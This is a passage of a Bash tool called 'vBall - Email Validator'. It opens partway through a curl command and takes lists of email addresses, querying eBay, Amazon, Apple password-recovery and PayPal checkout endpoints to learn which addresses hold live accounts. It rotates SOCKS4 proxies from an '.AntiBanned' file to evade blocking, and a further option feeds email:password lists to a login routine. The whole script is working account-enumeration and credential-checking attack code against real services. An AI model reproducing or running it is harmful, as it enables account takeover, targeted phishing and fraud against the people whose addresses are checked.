7kS3Y1Xs2QuZZ5MthYmZTlcJHlazxI89vOr3msCI%2BC1UkNF4%2BBV57JESefoPFCABdmtdrRh9GOMTK6Vi%2Fqa6JxazgE9syZ%2FNpR1sx%2FHeOxslloxhIYcCm3Rosgds1zQj9xORoRkbX4syjTEzAGPnCOBg%2Fr0jg6mqxkQ5NZPQK%2F5n7kPD8O8xsi8JdOMHBlMjluY7ldypyYRh70Xd7zcXZMmIyguuIHNGBluTj9w7OCt7r84Lt9higt5J1M6C06oJpb6OA5IHLE%2BXuhXquzNXUs34Onqan6%2FYvRaYGhb%2B7pRO8ZXZddsnPcLuJ%2FPh%2BG8RNcAajKOPYkSIs4LtenAk%2FgLOJOJeu%2F89J5pbA9pwy6KPzE%2BgDnQY5rswWkDIKv6hMjHFaLXOIcLroKs87i91q6MuBrOSFTZ3s3m6w2cfcQtDhC71FXd%2BG0YM3tGM1imfxQcSBEzltx3pH%2FAfQmRMshXohwD3vLkyQ0k5xAOL7761jp1PtpDASj27HfsJvepz4kd0ukTQs7qaARuFRPJMgxc57Z2rCHn8KIXi7BgfW1PkuefIZBIUo%2Ft8KarkKqMts%2FaACbX%2BpNUsGU%2FD9KI3zHUHZfOnapM8VeiuH0U1nkwE4QKFWooCQ%2BtuMocKWKJvnE0FFS5TstGrFnEUf0ShZQigGRsQFP3Zk7lKtW1jXFTjJgKDujEoWAeUQRNjkeOFlfF3V6R6MZkzmWXa6z6vs1DHdZAhONFbl4KekzeHybWck%2Fnh4NFFqfTy9%2Bp%2FpKqhFEq7vKP9TtkDhMqW9QGG9Zo9G0PQA4zUP7KrRoET2KQzK7oTY3qRj6YhiIqZGbGlYZit61DQ7E9L70uQyvYj4PjU3aJBztXKkX73dJuG3NdM4UgvWqaDjhfltfTSvJ%2FsiI51tLSSpHaoaJ7Xr%2Bny9z%2FFS%2FPQERVfBTR3gvSRSyWnQXIgBGMmnXmiphlcadMdlCCQcQ2uwXzGvdeS3QqRQXJD1GffpCHn7g64d7IjR7xSNKXzDJHjq329Wz5b22%2BAIb0PQZtXTN0IEWND%2FwXo02bETiR6UcCyIzTohPJP8KPMvNr1%2B4OGy2vOIMxcRJwJCGHHD6ImTeoiZGw5Ge%2BzaDWAJMXUylSaM65mfqPF0hvBlP4kqMUbR%2FqQUIakVPXraM0C5W24In%2FVhoA17PCwGQ0N49NQXMdo388w1iesaNgGGbdy5D1gjV%2Bn0HXS29yfx83L91pWygYs%2FswoNm8NqsT5bdlFBt9M0ZarZwaedZPRqTwxZhWysWQfYvL3Ij1Gd76PxX9%2BhcMIpBbM4IDHNsGxbZhVOyU%2B7yI%2BPbg2ZlphAxG%2B77H8OrtZlWxxoZmOx2lF6mMhAN%2F%2B%2FpxRNDjxHjb3nYiufon5M%2FRxhHcaOWhSz%2BgHsEHTUss7%2FSajIKQZuTcagEg45rBgz%2BoI45VXBScczyota5kKvxPeBPZSstwVAZe4MNyqYzgK1Y0ty58Q9oDjDFj8apii7Z9zTR1A6HxjPgA%2F3DtGxAsIp%2B8qcx5y0etJq6yWZ1pyGFX2HULi7X7FjJaj2abTxj1et9WTvLFtMZQ62KQf39tt0EvCfjd8PXQESG%2Fy%2Bxc2qp5NF9xIJLsd3HyOl5qPvNIH83yDFGOQO23DdSu9ydc9GYM%2FWA2XWlu1hOATIe5f%2BXKyvRi0ZHe0usf%2BnLbYeX3FSyBNXX97ALpL6jrSH4QIMtbzp5lcciabdf68ZgdOMQLFbZH480BEF0x5EP1SwuweivKruNEOwyi8sMnhs15iY%2BmKbmK4peHVifetLKRROy6Cu5z2OcirTho85M%2B7m5VojLoXdbRqMF3%2BM6Xa4fOO0lTvaUlGvYVqIELxOJKMyLLWCWU%2FDU2Zh0nh4kjNHy7DV%2BcT%2BrS9%2BdUYXq%2B2suGDDIEUNvfP3hQ2WwwsXAzMjhe%2FPKgRpwTx93Wd8dirMWaTGhoqJBS2kTQoOSqTtFp1USNdYj7xdvm5zYiqetcds8Ztfll9knmXpiwmPxPMRKz2ipIJFDz%2F4d0HY0WyAVQopqQW62SkHyPOviVIcs1EmojX1Y6HkV7S2351Z%2FcLtr3lIhKGD0yYzoQg9nyY6EO9fnCdrY72lKdZI0mej3V4LVfezTnq%2FgKtpav0hl2E5EamGKBmq%2BOaDV9DrrK5XK%2FxC5q83FkYBZMOcSBRq1eEAJolZf4yg7WtdpUVpvcnfb77ql7csyJLXMu1suvMQ4ui5%2FBqESW2s7AjfUQMAKXo21dwA%2FVXSG3VQvQ2hyI9dJZIi7y%2Bk7l8tz%2FkaG4mRBoezaleOrtEaGdw%2BkHDBaRnd77vlqjk%2BN7DF2fLTTatjN4ErmUpe6v2lugFwbWUnZPeqY13dbPG3WB6h4ETmel3Ma%2F4QWjg40drJ7WRUzqQN6WFSlTzVCXRkXImfF36KtjjfG7KSMUilhalkmNm9JEWYjJtGgQ3qUpZeVR3Zx3I2kUEZjLpmxs9Tk%2BeE8U5ghKXdAnDsLs2dIKpZJCLylVYwVLvDG5j9n4EEYnCiSSvN86VQfT1Ig%2BtbSMQy2bws4tXxiSD8UgzL8IVZ%2FepElFhNSjBohtcEA%2FcFzwJxRq6RmbnMr%2FN2oDzHWaa81i6RisQpZsrOgaxW6kRpYmAyacdN%2B301zKKV2%2Bh8XwUmjdDIJ%2BXh85m53hmVwiGINNHT11D4UrQHsdkGPMEY929chza315O%2F6F5MspFbO6FIGXPMINUg95bJRdq3oCYtj%2Fgcb6k0ssZ3HEKiVdX1Y9H%2F39TsZ83MDDBI3%2BSdBH7%2FQCHbDoUXP8b8CFOx4fHHUSkUxqV0tcFocWN70LN6DSIiu%2BPts0dnscAC%2FwpkHOroNpGr1zzZbGoSKIwE3c%2F12zAhIbH23aRU9JzbNxb%2FyT%2Bb3S%2BujHVi2Unr9qN9ix%2FNoT3Y4ZsZpxB3E6flXsHmLCNnWnDb9BRzwgJylNR49GLUyb2PS9v80WUZqXSqTgBsa819vCz%2BXDBz3zDupEi%2F7QaM9BCu5j7DawctYII%2BzyX%2BE5MunBNynYVG%2FP8W2g5TvwHGXODWti7mIKXkOy7LDFThZnUKMrGuLP6ggmoRA%2ByNjlLl4%2BpzK1r4ertokhwLlcqH%2BH6lTkRHKavNavP7W4wmFRjLj8Uffx7gd%2FSgqkG4ogXHkt3oKWoTlCCce3ueQ0FtHWV3XTImpeju22fxF%2B2OENDay%2FZqLnvyl72JSfObUll%2FJjG%2FOI9LUByBfzg3mkoduqve64FxPgalDdGTJClwTDrBvLhjKmQ5qf7Mva2%2Fj8LVExD0DJm2SZKM6LXvYi2Iebo659QOoJP2dsT6gCE9AaxeliZTSbRIKV4bP6lH8RmYoW4m8MuQ669pSHMtZOcnj7W4wplW3bnsyECwWjeXI7%2FncKxNZWuXxDpANA%2B3jAcA6dO4FZAGYK9SJi8VI%2B%2FQCsMFHWyGLN3vIjT2bIckxc2XI4lomlr52drT%2Fp4v3uHX7IiHgcEM9vByF1DAlScUIKIQoCnvHrnpdq021LvSF%2Fr49kJCU3Bl7OX5uSwC%2FV1EI8%2FDgPNaTq8z%2FxxxjqcvSbNkceSUUa%2FPNf40CsRh8AJYJPuokKgvb3fong1U%2F5wGeK3PbA7yPqocfxzI2FlC9wo1TCNPVIrfMdOM6YxRbvPJEOFoXRQbou8EqaBGwjk5EDA6n9G4kVeREZxJMkzpu4DcGpZICTdb2XLdmlnAdam8JkpetwrXR5yCdaQIDT8pwDfYUp76ppLVwKCTGeALsSd2pe3u2enOf4RDLc7iLL0GFJ7AgsNI5SJZova3c259s4yhpWuqF%2F2jPzyruEkpwUATIwcBgAWGOt94p1VIu4HBUWgoU%2F5BnnpTZxXFUYi45s8AZD7YY8%2FsXpArj9vArx%2FEdap9eDTVHCfc8GtC3xLLtAmvfHvNJZ8BUySGe0wb%2BTRVpaAnAUzmivMFC3xnqOHbf%2B7GuMZ3LyQsT8ZcDCSV6i%2FDJ0Zjb7WeEg%2FlROVjrrjnDuJ39kKF3JuYWEyhv8htlIZ0ZyYNZ8oPafOikjJVlrLOEJumkvO2gs%2BKdCWTx%2B%2FlDqSo7u80%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.UgmydEtE-J-sjtES5aJ3AXAilru8CikDkrXSNiKAUpNFOG8DRntP0Q.yedAVOYNXWQNXScm._kpxYtbccfSSu0nYG8UabaZ6PK3vcNWGeHG4fEsfkm1qmHroOGxuU0qkHRe5xbPkLo4E_fjXyDBs9JsgmK6hTQV65YOHoCtNr6Qq9ToyY9Q9-6h1OkZoEOhmkRmU-93Nish4LMFlw8TvxQZagWjxvWiSZnRP_4NxnFDfP1iy6MkFTXsvgeR3EkkdmzD1x8Y0BmFR4vjH2z5B2JdhOAYykfiYiaWnZElhsR7zGYjhHg9UnqGncxM8rwcjK4qmtn6UyWkJ.sxwbRl6eFH31PgtClCSQUQ&appActionToken=35Y7TtbEVzwCJrDLkq4sj2FCimqoIj3D&appAction=FORGOTPWD&email='$2'' --compressed -s -L`
        duration=$SECONDS
        
        grab=$(echo "$posted" | grep -ic "We're sorry. We weren't able to identify")
        header="veBall Version 1"
        footer="[Amazon Validator]\n"
        if [[ $grab == 1 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${RED}DIE [!] $2 ${CYAN} $footer"
            echo "$2" >> $4/die.txt
        else
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/live.txt
        fi
        printf "\r"
    elif [[ $1 == 3 ]]; then
        SECONDS=0
        check=`curl --socks4 "$7" --max-time 15 'https://iforgot.apple.com/password/verify/appleid' -H 'Cookie: s_orientation=%5B%5BB%5D%5D; s_invisit_n2_us=4; POD=us~en; s_ppvl=acs%253A%253Apsp%253A%253Aapple-id%253A%253Alanding%2520%2528en-us%2529%2520%2C75%2C75%2C2429%2C1360%2C677%2C1360%2C768%2C1%2CP; s_orientationHeight=677; s_campaign=oas-us-domains-apple.id; s_ppv=acs%253A%253Apsp%253A%253Aapple-id%253A%253Alanding%2520%2528en-us%2529%2520%2C76%2C76%2C2453%2C1360%2C677%2C1360%2C768%2C1%2CP; ccl=gs3te8HI35vqq4Qiek8nGw==; geo=ID; s_pathLength=support%3D3%2Chomepage%3D1%2Ciphonex%3D1%2C; s_vnum_n2_us=4%7C1; s_aca_ct=%5B%5BB%5D%5D; s_ptc=%5B%5BB%5D%5D; s_sq=appleusiphonex%3D%2526c.%2526a.%2526activitymap.%2526page%253Diphone%252520x%252520-%252520overview%252520%252528us%252529%2526link%253Dapple%252520home%252520-%252520%25252F%252520-%252520ac-globalnav%252520-%252520%25252302%2526region%253Dac-globalnav%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Diphone%252520x%252520-%252520overview%252520%252528us%252529%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fwww.apple.com%25252F%2526ot%253DA; as_xs=cr=1; as_pcts=KnaJZGjIZXQMpqrkdPucnLyJ+Je2r5pUXhHXqZk9Kxb9WindM_dSe4Q:M_OaIBI1g_T; as_xsm=1&jlujknym/us&i6qDBv1AZusLg-_BP0H--w; as_sfa=Mnx1c3x1c3x8ZW5fVVN8Y29uc3VtZXJ8aW50ZXJuZXR8MHwwfDE=; s_fid=630EFA0E47C55947-25ED76A04A8F0BEA; s_cc=true; pxro=1; s_vi=[CS]v1|2DCA4C7D852E09FC-60000C40E00005F4[CE]; dssid2=9a85b408-2a4b-48c6-b2e7-920b6b8913bb; dssf=1; as_dc=nwk; ifssp=236244C5441DFA3430FE2F0D20745FC3F53EB93DD1721FC604CE311D8252D82938C06898B803CF9838CB37AF37293B3AD5C0982ED5C015723D31C07288EF2D9243D77F2146199AF1861EB397E8AFCE8CB7C3D112EFF61A0D0ECAAFE4A2F8597BCCF4AC5C7C6A3FF7F89691B891396DEBB6F5AB47F00B9421; idclient=web; dslang=US-EN; site=USA; X-Apple-I-Web-Token=AAAAKjN8NmI0NjQxZjRhOTM4NjBmYTNhYzM5OTgwNzhhZjdkMTAAAAFlvISrRZ/YrKfYk/5++lzZtQuUHsueciN1vzEbN4kFykcuaYOT56HqO1YAAAtcW7tMTAQDNFTCvoy4/z9zbuKU+Dnk2uc0WH4UFlMOty+eAuE4Sw==' -H 'Origin: https://iforgot.apple.com' -H 'Accept-Encoding: gzip, deflate' -H 'X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36","L":"en-US","Z":"GMT+07:00","V":"1.1","F":"Nda44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZragszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWkTpjCF48gmexf7_OLgiPFMJhHFW_jftckkCoqAkCoq0NUuAuyPB94UXuGlfUm0NUbNiqUU8jCOlzXJJIneGffLMC7EZ3QHPBirTYKUowRslzRQqwSM2VxfTPV9IO_KvLG9mhORoVjnjk3nKrOySXvOk4JOKxdzXrdwNBwe98vDdYejftckuyPBDjaY2ftckZZLQ084akJmF0.OGV8v5jAR0odm_dhrxbuJjkWxv5iK758FSQrJLqDxp4jV1dY.4I6NvgRcWprTL4yNAwcEXGfe2ReFBHdurNW5CfUXtStKjE4PIDxO9sPrsiMTKQnlLZnjxGQUhkY5BSp55BNlan0Os5Apw.1nz"}' -H 'Accept-Language: en-US,en;q=0.8' -H 'sstt: hb4ZISY21YV48p9anIs5%2Fg%2BqBTtloSEFIvBqpVh8GfqIhJD6bbf8OA%2Fr95L0A3avmhRVZjwWdJt0PQBlY9u9%2B4%2FjaRXfrQAffZEFtpcoJxLV8%2FXNk44c7%2Fhy25XSx1c8K9zyAPGff%2BF5%2F3XY8EkCERjuyMCbuPFLcvIEp42i5j4TL9PyjImLQVyiYymKUXxHxap2L1%2F459HUPoCBjHgC1mccSdNRydcVtcuDZkRlyNMhjMCbj%2FQur8rbr4p5Oj0o%2Fg1vAjmHEwF1qwgANhum3E8ooHeZDaTwYxBHsDNjeMjcZBJgYciKxJBaTuTaDsYWYsTNGzGoEqCsQxi%2FEJwCsWOHj68%2BHMZ9DaNwTo6sWYsSSoz%2BTvb0H7wTDX9%2FTigDcpCRxMAtgYRvTMyb' -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://iforgot.apple.com/password/verify/appleid' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --data-binary '{"id":"'$2'"}' --compressed -s`
        grab=$(echo "$check" | grep -ic "false")
        duration=$SECONDS
        
        header="veBall Version 1"
        footer="[Apple Validator]\n"
        
        if [[ $grab == 1 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${RED}DIE [!] $2 ${CYAN} $footer"
            echo "$2" >> $4/die.txt
        else
            hotmail=$(echo "$2" | grep -ic "hotmail")
            aol=$(echo "$2" | grep -ic "aol")
            gmail=$(echo "$2" | grep -ic "gmail")
            yahoo=$(echo "$2" | grep -ic "yahoo")
            live=$(echo "$2" | grep -ic "live")
            if [[ $hotmail > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/hotmail.txt
            elif [[ $aol > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/aol.txt
            elif [[ $gmail > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/gmail.txt
            elif [[ $yahoo > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/yahoo.txt
            elif [[ $live > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/live.txt
            else
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/live.txt
            fi
        fi
        printf "\r"
    elif [[ $1 == 4 ]]; then
        SECONDS=0
        
        posted=`curl -b cookies.txt -c cookies.txt --socks4 "$7" --max-time 15 'https://www.paypal.com/cgi-bin/webscr?lc=EN&cmd=_cart&business='$2'&upload=1&no_shipping=1&lc=us&item_name_1=www.ibal.com&amount_1=9.99&currency_code=EUR' -H 'authority: www.paypal.com' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' --compressed -L -s`
        duration=$SECONDS
        business=$(echo "$posted" | grep -Po '"merchant_country": *\K"[^"]*"' | sed 's/\"//g')
        grab=$(echo "$posted" | grep -ic "merchant_country")
        grab2=$(echo "$posted" | grep -ic "merchant_display_id")
        grab3=$(echo "$posted" | grep -ic "merchantId")
        grab4=$(echo "$posted" | grep -ic "be working at the moment. Please try again later")
        grab5=$(echo "$posted" | grep -ic "berbagai fitur tidak berfungsi saat ini. Coba lagi nanti")
        grab6=$(echo "$posted" | grep -ic "paymentsdk")
        header="veBall Version 1"
        footer="[Paypal Validator]\n"
        
        if [[ $grab > 0 ]]; then
            bocap=$(echo "$posted" | grep -Po '"brand_name": *\K"[^"]*"' | sed 's/\"//g')
            bocap2=$(echo "$posted" | grep -Po '"merchant_display_id": *\K"[^"]*"' | sed 's/\"//g')
            if [[ $bocap == $2 || $bocap2 == $2 ]]; then
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${GREEN} [$business]${CYAN} $footer"
                echo "$2" ["$business"] >> $4/livefull.txt
                echo "$2" >> $4/live.txt
            else
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${GREEN} [$business] [BUSINESS]${CYAN} $footer"
                echo "$2" ["$business"] [BUSINESS] >> $4/livefull.txt
                echo "$2" >> $4/live.txt
            fi
        elif [[ $grab3 > 0 ]]; then
            grabaja=$(echo "$posted" | grep -ic "merchantCountry")
            if [[ $grabaja > 0 ]]; then
                business=$(echo "$posted" | grep -Po '"merchantCountry": *\K"[^"]*"' | sed 's/\"//g')
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${GREEN} [$business]${CYAN} $footer"
                echo "$2" ["$business"] >> $4/livefull.txt
                echo "$2" >> $4/live.txt
            else
                printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${RED}DIE [!] => $2 ${CYAN} $footer"
                echo "$2" >> $4/die.txt
            fi
        elif [[ $grab4 > 0 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/live.txt
        elif [[ $grab5 > 0 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/live.txt
        elif [[ $grab2 > 0 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${RED}DIE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/die.txt
        elif [[ $grab6 > 0 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${RED}DIE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/die.txt
        else
            printf "${YELLOW}[$header] ${PINK} $6 Line left  => ${YELLOW}UNKNOWN [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/unknown.txt
        fi
        printf "\r"
    fi
}
clear
#Original Version
socksLists='.AntiBanned'
#Open
opening(){
    printf "$CYAN---------------------------------------------------------------------\n"
    printf "$CYAN                vBall - Email Validator                      \n"
    printf "$CYAN---------------------------------------------------------------------\n"
}

clear
opening
cat <<EOF

		Checker version 1
		
	List Tools Tersedia:
	1). Ebay Validator (Still Active)
	2). Amazon Validator (Still Active)
	3). Apple Validator (Still Active)
	4). Paypal Validator (Need Improve Version Soon | Still Active)
	
EOF


read -p "Enter type  tools: " typetools

#Tools check
if [[ $typetools == 1 || $typetools == 2  || $typetools == 3 || $typetools == 4 ]]; then

    #Input
    read -p "Enter Mail list: " fileList
    read -p "Folder Location: " locate
 
    #Check Folder Target
    if [[ ! -d "$locate" ]]; then 
        echo "[+] Creating $locate/ folder"
        mkdir $locate
    else
        read -p "$locate/ already exists, want to continue? (y/n): " continue
        if [[ $continue == 'n' ]]; then
            exit 1
        fi
    fi
 
    #Input
    read -p "Delay (0 for no delay): " delay
 
    #Check Email not found
    if [[ ! -f "$fileList" ]]; then
        echo "[404 ERROR] Email file not found.."
        ls -l
        exit
    fi
 
    #Cleaning & Set Email line
    grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $fileList | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $fileList
    totalLines=`grep -c "@" $fileList`
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $fileList))'
    
    #Socks Valid
    if [[ $typetools == 3 || $typetools == 4 ]]; then
        IFS=$'\r\n' GLOBIGNORE='*' command eval  'sockss=($(cat $socksLists))'
    fi
    
    #Input Status
    if [[ $delay == 0 ]]; then
        echo "[!] Sending checking status from $fileList without delay."
    else
        echo "[!] Sending checking status from $fileList every $delay seconds."
    fi
 
    #Count
    con=1
    limit=0
    
    fu=0
    #Looping
    for (( i = 0; i < "${#mailist[@]}"; i++ )); do
        if [[ $typetools == 4 ]]; then
            if [[ $delay == 0 ]]; then
                if [[ $fu == 10 ]]; then
                    sleep 1.5
                    fu=0
                fi
                let ++fu
            fi
        fi
        if [[ $typetools == 4 || $typetools == 3 ]]; then
            sock=`shuf -n1 $socksLists`
        fi
        email="${mailist[$i]}"
        indexer=$((con++))
        tot=$((totalLines--))
        duration=$SECONS
        sleep $delay
        #Function Call Validator
        validator "$typetools" "$email" "$fileList" "$locate" "$indexer" "$tot" "$sock" "$socksLists" &
   done

   echo "[+] Waiting background process to be done"
   wait
   wc -l $locate/*
   
   duration=$SECONDS
   echo "[!] Checking successs $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds."
elif [[ $typetools == 5 ]]; then
    #Input
    read -p "Enter list (email:password): " fileList
    read -p "Folder Location: " locate
 
    #Check Folder Target
    if [[ ! -d "$locate" ]]; then 
        echo "[+] Creating $locate/ folder"
        mkdir $locate
    else
        read -p "$locate/ already exists, want to continue? (y/n): " continue
        if [[ $continue == 'n' ]]; then
            exit 1
        fi
    fi
 
    #Input
    read -p "Delay (0 for no delay): " delay
 
    #Check Email not found
    if [[ ! -f "$fileList" ]]; then
        echo "[404 ERROR] Email file not found.."
        ls -l
        exit
    fi
 
    #Get Email Password
    totalLines=`grep -c ":" $fileList`
    x=$(gawk -F: '{ print $1 }' $fileList)
    y=$(gawk -F: '{ print $2 }' $fileList)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'password=($y)'
    
    #Input Status
    if [[ $delay == 0 ]]; then
        echo "[!] Sending checking status from $fileList without delay."
    else
        echo "[!] Sending checking status from $fileList every $delay seconds."
    fi
 
    #Count
    con=1
    limit=0

    fu=0
    #Looping
    for (( i = 0; i < "${#email[@]}"; i++ )); do
        user="${email[$i]}"
        pws="${password[$i]}"
        
        indexer=$((con++))
        tot=$((totalLines--))
        duration=$SECONS
        sleep $delay
        
        #Function Call Validator
        login "$typetools" "$user" "$pws" "$fileList" "$locate" "$indexer" "$tot" &
   done

   echo "[+] Waiting background process to be done"
   wait
   wc -l $locate/*
   
   duration=$SECONDS
   echo "[!] Checking successs $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds."   
fi